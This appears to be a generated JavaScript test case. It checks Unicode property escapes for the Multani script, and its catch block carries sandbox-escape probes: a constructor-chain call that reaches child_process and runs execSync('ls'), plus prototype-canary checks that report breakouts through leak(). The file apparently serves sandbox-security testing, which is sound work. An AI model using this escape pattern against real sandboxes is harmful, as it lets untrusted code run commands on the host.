try {
    const matchSymbols = buildString({
        loneCodePoints: [70280],
        ranges: [
            [
                2662,
                2671
            ],
            [
                70272,
                70278
            ],
            [
                70282,
                70285
            ],
            [
                70287,
                70301
            ],
            [
                70303,
                70313
            ]
        ]
    });
    testPropertyEscapes(/^\p{Script_Extensions=Multani}+$/u, matchSymbols, '\\p{Script_Extensions=Multani}');
    testPropertyEscapes(/^\p{Script_Extensions=Mult}+$/u, matchSymbols, '\\p{Script_Extensions=Mult}');
    testPropertyEscapes(/^\p{scx=Multani}+$/u, matchSymbols, '\\p{scx=Multani}');
    testPropertyEscapes(/^\p{scx=Mult}+$/u, matchSymbols, '\\p{scx=Mult}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [
            70279,
            70281,
            70286,
            70302
        ],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                2661
            ],
            [
                2672,
                56319
            ],
            [
                57344,
                70271
            ],
            [
                70314,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script_Extensions=Multani}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Multani}');
    testPropertyEscapes(/^\P{Script_Extensions=Mult}+$/u, nonMatchSymbols, '\\P{Script_Extensions=Mult}');
    testPropertyEscapes(/^\P{scx=Multani}+$/u, nonMatchSymbols, '\\P{scx=Multani}');
    testPropertyEscapes(/^\P{scx=Mult}+$/u, nonMatchSymbols, '\\P{scx=Mult}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}